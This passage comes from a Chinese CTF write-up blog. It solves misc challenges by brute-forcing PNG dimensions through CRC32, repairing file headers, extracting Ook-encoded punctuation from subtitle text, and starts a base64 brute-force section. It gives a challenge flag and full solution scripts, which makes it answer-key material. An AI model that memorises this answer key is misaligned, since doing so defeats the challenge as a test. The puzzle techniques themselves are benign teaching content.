crc32_hex):            print(i, j)            print(&#39;wid:&#39;, hex(i))            print(&#39;hight:&#39;, hex(j))</code></pre><pre><code class="python">795 937wid: 0x31bhight: 0x3a9</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090542555.png" alt="image-20230412090542555"></p><p>在看图片头 明明是png文件 文件头却是jpg的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090627015.png" alt="image-20230412090627015"></p><p>同时文件尾也存在问题 对照正确格式的png文件将其文件首尾改正</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090744934.png" alt="image-20230412090744934"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090756900.png" alt="image-20230412090756900"></p><p>打开图片是”智慧的”的阿尼亚和提示</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412090840027.png" alt="image-20230412090840027"></p><p>提示GB 2312就是汉字编码字符集的意思 或许我们应该注意一下文档中的汉字 或者对其进行什么操作</p><p>文档内容是将文档中给出的原视频的字幕提取出来了 对比原视频 好像文档中的字幕多出了。！？这三种标点符号 猜测是Ook编码</p><pre><code class="python">import reimport stringprint(&#39;Start!&#39;)string = &#39;阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.好帅好帅!阿尼亚棒吗?可爱,可爱!阿尼亚不想去上学了!阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?交给我吧!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.阿尼亚好兴奋!阿尼亚可爱吗?阿尼亚要加油!阿尼亚在学校也会加油的!好想有个母亲爱我.阿尼亚帅不帅?阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.哇酷哇酷?阿尼亚必须加油!我想永远和他们在一起.阿尼亚棒吗?父亲做菜很好吃.多亏了父亲.营救公主的间谍!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.是住在城堡里的奇美拉!阿尼亚帅不帅?救命呀!救救我！劳埃德曼!好想有个母亲爱我.蓬蓬头?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!哇酷哇酷?阿尼亚喜欢厉害又帅气的母亲.阿尼亚棒吗?太好了!都怪阿尼亚踩到了粑粑.阿尼亚可爱吗?花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚一点也不在意.阿尼亚帅不帅?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚在学校也会加油的!蓬蓬头?阿尼亚必须加油!营救公主的间谍!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚可爱吗?是住在城堡里的奇美拉!阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚帅不帅?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.救命呀!父亲和母亲甜甜蜜蜜.蓬蓬头?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.救救我！劳埃德曼!哇酷哇酷?阿尼亚好想看呀!完美的劳埃德曼,好想看呀!要是不向次子道歉,世界和平就完蛋了.阿尼亚棒吗?看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚可爱吗?欢迎来到阿尼亚家.阿尼亚帅不帅?阿尼亚想吃蛋包饭!阿尼亚想穿这身衣服出萌.蓬蓬头?警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.交给我吧!多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.父亲,阿尼亚合格啦!会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚好兴奋!阿尼亚想穿这身衣服出萌.哇酷哇酷?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.阿尼亚要加油!阿尼亚棒吗?阿尼亚在学校也会加油的!阿尼亚必须加油!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚帅不帅?要是不向次子道歉,世界和平就完蛋了.蓬蓬头?可爱,可爱!欢迎来到阿尼亚家.哇酷哇酷?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!阿尼亚想穿这身衣服出萌.阿尼亚棒吗?阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.父亲,母亲,有需要帮助的人!阿尼亚可爱吗?要帮助他!太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.蓬蓬头?母亲是杀手.哇酷哇酷?花生!父亲和母亲甜甜蜜蜜.阿尼亚棒吗?会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.阿尼亚想吃蛋包饭!父亲是间谍.警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!母亲是杀手.阿尼亚可爱吗?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.营救公主的间谍!阿尼亚帅不帅?是住在城堡里的奇美拉!救命呀!欢迎来到阿尼亚家.蓬蓬头?阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.哇酷哇酷?阿尼亚不想要这个妈妈.阿尼亚棒吗?救救我！劳埃德曼!父亲是间谍.阿尼亚可爱吗?阿尼亚好想看呀!母亲是杀手.阿尼亚帅不帅?父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.完美的劳埃德曼,好想看呀!蓬蓬头?看我必杀拳,砰!好耶!欢迎来到阿尼亚家.哇酷哇酷?父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!阿尼亚棒吗?阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?可爱,可爱!阿尼亚想去你家玩.阿尼亚帅不帅?阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!阿尼亚从孤儿院出来以后,遇到了好多开心的事.太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!阿尼亚好失落.蓬蓬头?好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.好帅好帅!哇酷哇酷?可爱,可爱!阿尼亚不想去上学了!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚棒吗?交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚可爱吗?我想永远和他们在一起.阿尼亚帅不帅?救命呀!父亲做菜很好吃.蓬蓬头?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!多亏了父亲.哇酷哇酷?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚想吃蛋包饭!阿尼亚棒吗?警惕!阿尼亚想像母亲一样厉害!阿尼亚喜欢厉害又帅气的母亲.阿尼亚可爱吗?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.阿尼亚帅不帅?我想永远和他们在一起.蓬蓬头?好帅好帅!父亲做菜很好吃.哇酷哇酷?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.可爱,可爱!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.阿尼亚不想去上学了!阿尼亚可爱吗?交给我吧!父亲,阿尼亚合格啦!父亲做菜很好吃.阿尼亚帅不帅?阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!蓬蓬头?多亏了父亲.哇酷哇酷?救命呀!太好了.阿尼亚棒吗?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!母亲,给阿尼亚做特训吧.阿尼亚可爱吗?要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.看我必杀拳,砰!阿尼亚帅不帅?好耶!父亲,母亲,有需要帮助的人!阿尼亚喜欢厉害又帅气的母亲.蓬蓬头?都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.哇酷哇酷?会没事的.阿尼亚棒吗?要帮助他!父亲和母亲都很有趣,我最喜欢他们了.阿尼亚可爱吗?我想永远和他们在一起.父亲做菜很好吃.太好了!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.花生!蓬蓬头?阿尼亚想吃蛋包饭!警惕!父亲是间谍.哇酷哇酷?阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!阿尼亚棒吗?母亲是杀手.阿尼亚可爱吗?救命呀!父亲和母亲甜甜蜜蜜.阿尼亚帅不帅?救救我！劳埃德曼!阿尼亚好想看呀!完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!会没事的.蓬蓬头?父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚好想看呀!哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!阿尼亚一点也不在意.阿尼亚棒吗?阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚可爱吗?阿尼亚想去你家玩.阿尼亚帅不帅?好耶!阿尼亚从孤儿院出来以后,遇到了好多开心的事.蓬蓬头?阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.父亲,母亲,有需要帮助的人!太好了.哇酷哇酷?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.要帮助他!阿尼亚棒吗?太好了!花生!我想永远和他们在一起.阿尼亚可爱吗?阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!阿尼亚在学校也会加油的!阿尼亚必须加油!营救公主的间谍!是住在城堡里的奇美拉!救命呀!救救我！劳埃德曼!阿尼亚帅不帅?父亲做菜很好吃.蓬蓬头?阿尼亚好想看呀!多亏了父亲.哇酷哇酷?完美的劳埃德曼,好想看呀!看我必杀拳,砰!好耶!父亲,母亲,有需要帮助的人!要帮助他!太好了!花生!阿尼亚想吃蛋包饭!警惕!阿尼亚想像母亲一样厉害!好帅好帅!可爱,可爱!阿尼亚不想去上学了!交给我吧!父亲,阿尼亚合格啦!阿尼亚好兴奋!阿尼亚要加油!太好了.阿尼亚棒吗?母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.阿尼亚在学校也会加油的!阿尼亚可爱吗?阿尼亚必须加油!营救公主的间谍!多亏了父亲.阿尼亚帅不帅?太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.蓬蓬头?我想永远和他们在一起.哇酷哇酷?是住在城堡里的奇美拉!父亲做菜很好吃.阿尼亚棒吗?多亏了父亲.太好了.母亲,给阿尼亚做特训吧.要是不向次子道歉,世界和平就完蛋了.欢迎来到阿尼亚家.阿尼亚想穿这身衣服出萌.阿尼亚想去你家玩.阿尼亚从孤儿院出来以后,遇到了好多开心的事.阿尼亚好失落.好想有个母亲爱我.阿尼亚喜欢厉害又帅气的母亲.都怪阿尼亚踩到了粑粑.阿尼亚一点也不在意.阿尼亚不想要这个妈妈.父亲是间谍.母亲是杀手.父亲和母亲甜甜蜜蜜.会没事的.父亲和母亲都很有趣,我最喜欢他们了.我想永远和他们在一起.父亲做菜很好吃.多亏了父亲.救命呀!太好了.阿尼亚可爱吗?母亲,给阿尼亚做特训吧.&#39;temp = re.sub(&#39;[\u4e00-\u9fa5]+&#39;, &#39;&#39;, string)with open(&#39;decrypt_flag.txt&#39;,&#39;w&#39;) as ff:        for i in temp:                if(i == &#39;.&#39; or i == &#39;?&#39; or i == &#39;!&#39; ):                        ff.write(i)print(temp)print(&#39;End&#39;)</code></pre><p>先将文本中的中文的。！？全部换为英文的.!? 在写脚本将其提取出来</p><p>其中’[\u4e00-\u9fa5]+’的意思是unicode编码 且正好是中文编码开始和结束的两个值 这个正则表达式就是用来判断字符串中是否含有中文</p><p>此处在提一下python中re模块中sub功能的用法</p><pre><code class="python">sub()替换,count不写默认为全体换&#39;&#39;&#39;res = re.sub(&#39;[0-9]+&#39;, &#39;?&#39;, &#39;abc2abc8abc4d&#39;, count=2)print(res)  #结果为abc?abc?abc4d</code></pre><p>然后将得到的标点进行Ook解码</p><pre><code class="python">..........,.....,.,..!?,!!.?.,...........,.....,.?,.?!.?..,...........,.....,.,....,...........,..,!.?..,.,....,..!?!!.?........?,.?!.?..!.?,.,....,..!?!！!.?!,!,!!,,!!?.?!.?!!!!!,!!!,!!!.?.....,..!?!!.?..,.,...?.?!,.?........!.?.,.....,.！!?!,!,.?,!!,,!!!!?.?!.?!!!,!!.,...........,...!..,.,....,..........,!.,.....,.,..!.?.,...........,.....!?!!,.?!!!！!!,!,!!,,!!!!!!!!?,.?,!.?!!,!!!!!!!!！!!,!,!!.?.,...........,...,,!?!!.?.,.,....,........?.?!.?.,.....,.,....,.......!.!!!,!!!,!!!!!.?..,.....,.,.!?!!.?..,......?.?！!.?!.?..,.....,.,.,!?,!!.?,,!!!!!!!!?.?,!.?!!,!!!!!!!!！!!,!,!!,,!!,.!!!!!.?.........!?,!!,.?!,!!!!!!!?.?!.?！!!,!,!!,,!!!!.?.,.,....,...!?!!.?.......,.?.?!.?..,.,....,.....,!.?.....,..!?!,!.?!!!!!!?.?!.?！!!,!,.?,....,...,!?!,,!.?......?.?!,.?..!.?.,.,....,.......!?!!.?!!,!!!,!!!!!!!?.?!.?！!!,!,!!,,!!!!!!!!,!!!,!!!!!!!!！!.?,.....,.,....,.....!?,!,!.?.....,.....,.,...?.?!,.?..........,....,,!.?,.,....,...........,.!?!!.?!!!!,!!!,!!!!!!!!！!?.?!.?,!,!!,,!!!!!!!!,!!!,!!!.?,.,....,...........,...!?!!.?.,.,....,...........,.?.?!.?..,.,....,...........,....!.?,.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412095552198.png" alt="image-20230412095552198"></p><p>:horse:ctfshow{4niya_KaWa1i!}</p><h2 id="低端的base64"><a href="#低端的base64" class="headerlink" title="低端的base64"></a>低端的base64</h2><p>base64是常见的用于传输8bit字节码 的编码方式或者说吧二进制变成文本数据的方式。三个原始字符对应着4个base64编码后的字符</p><p>如果需要编码的字节数不能被3整除，最后会多出一两个字节那么可以使用下面的方法进行处理：先使用0字节值在末尾补足，使其能够被3整除，然后再进行base64的编码。在编码后的base64文本后加上一个或两个“&#x3D;”号，代表补足的字节数。也就是说，当最后剩余一个八位字节（一个byte）时，最后6位的base64字节块有四位是0值，最后附加上两个等号；如果最后剩余两个八位字节（2byte）时，最后一个6位的base字节块有两位是0值，最后附加一个等号<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230412155156539.png" alt="image-20230412155156539"></p><p>所以见到加密字符串后面有等号的时候，可以考虑是不是base64编码</p><p>对于该题 可以对于编码后的base64字符4个4个的进行爆破 只要还原出来的3个原始字符在可见字符串的范围内即可</p><pre><code class="python">#encoding = utf-8#脚本是从ctfshow单身杯（2022年5月20日)misc2 没大没小的串串，解题脚本改的import string,base64,reimport itertools, tqdmx=&quot;5li65lqg6ziy5q2i5asn5a625oml5yqo5pon5l2c5oir5bey57up5oqk5byx6i6x6zibkgzsywcp6jep5zyo6l+z5q616k+d55qe5p+q5liq5zyw5pa55lqg77ym5l2g5lus5lin5lia5a6a5om+5b6x5yiw5zof77ym5zi75zi75zi744cc5awx56we5p2l5pwy5l2g5a626zeo77ym5bim552a56ev57sv5zkm54m55b6b77ym5z2m55m95luo5a695oqx5ous5luo5lil77ym5lin5zcs6k+d57uz5l2g5omt5lia6zki44cckgzsywcp5zyo5zoq6yem5zgakgzsywcp5zyo5zoq6yem77ymkgzsywcp5zyo6ykj5bcp5pyl5y+l55qe55y8552b6yem44cc5asp5a+55zyw77ym6zuo5a+56aoo44cc5asn6zmg5a+56zw/56m644cc5bgx6iqx5a+55rw35qcr77ym6lwk5pel5a+56iun56m544cc6zu36zqq6zqq77ym6zu+6jkz6jkz44cc5bya5bic5asn5zcj5lih5lql5lqo6yca44cc5bmz5lue5bmz5lue5bmz5bmz5lue77ym5lue5bmz5lue5bmz5lue5lue5bmz77ym5lue5lue5bmz44cc5lyx5oma5zgo55+l77ymj2n0znnob3cn55qekgzsywcp5yw35ash5lul5lil5yeg5liq54m554k577ym5lia5piv5lulj2n0znnob3cn5bya5as077ym5zco6z2i6lef552a6iqx5ous5y+35zkm5yeg5liq5awh5ocq55qe5lic6kw/77ym6ykj5liq5lic6kw/5y+r5ygaj3v1awqn77ym5li65lua5lmi5ymn6z2i6kab6k+06l+z5lmi5asa5bqf6k+d5zgi5piv5zug5li65lih5lia5lin6k+05bqf6k+d6l+z5liq6aky5bcx5asq5aw95yga5lqg6l+z5oco5lmi5y+v5lul5zgi77ym5lih5lia5pyj5lq65oqk6l+z5liq5lic6kw/5ps+5zyoy3lizxjjagvm6yem5lia5oqk5qkt5l2g5piv5qkt5lin5ye65p2l77ym54s25zco5yan57uz5oir6l+z5lmi5lia5liq6iux5pah5a2x5q+n5lia5liq6iux5pah5a2x5q+n55qe5ps55asn5bcp5yaz77ym6l+z5oco5lmi6io96kgm5zgi77ym6l+z6ikv5a6a5piv5lin6kgm55qe5a+55lin5a+5iwn0znnob3d7ymfzzty0xzfz5asq6zq+5lqgisfj5pyn5lqgvsf95oma5lul5oir6l+z5zue5zc45y+w5pwz6k6t77ym5zyo5ymn5zco6yo95yqg5lqg5lia54k554k55lic5lic77ym6l+z5qc35bcx5lin6io95pyj5bii5ykf5